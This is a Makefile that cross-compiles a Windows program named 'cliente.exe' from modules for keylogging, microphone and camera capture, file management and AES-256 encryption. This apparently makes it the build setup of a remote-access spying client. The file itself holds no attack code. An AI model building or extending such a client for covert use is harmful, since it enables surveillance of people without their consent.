LINK2=-lmfplat -lmfreadwrite -lmfuuid -lole32 -lmf -lstrmiids -luuid -lws2_32 -lwinmm -lwtsapi32 -lgdi32 -lgdiplus -lshlwapi -Wl,-Bstatic -s -w -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libgcc -Wl,-Bstatic
LINK=-lmfplat -lmfreadwrite -lmfuuid -lole32 -lmf -lstrmiids -luuid -lws2_32 -lwinmm -lwtsapi32 -lgdi32 -lgdiplus -lshlwapi
CFLAG=-Wall -Wextra -std=c++11 -pedantic -g
OBJ=main.o misc.o cliente.o mod_mic.o mod_file_manager.o mod_keylogger.o mod_camara.o
BIN=cliente.exe
CC=x86_64-w64-mingw32-g++.exe
RM=rm

%.o: %.cpp
	$(CC) $(CFLAG) -c -o $@ $<

$(BIN): aes256.o $(OBJ) 
	$(CC) -o $(BIN) $(OBJ) aes256.o $(LINK)

aes256.o: aes256/aes256.cpp
	$(CC) $(CFLAG) -c -o $@ $<

clean:
	$(RM) *.o $(BIN)

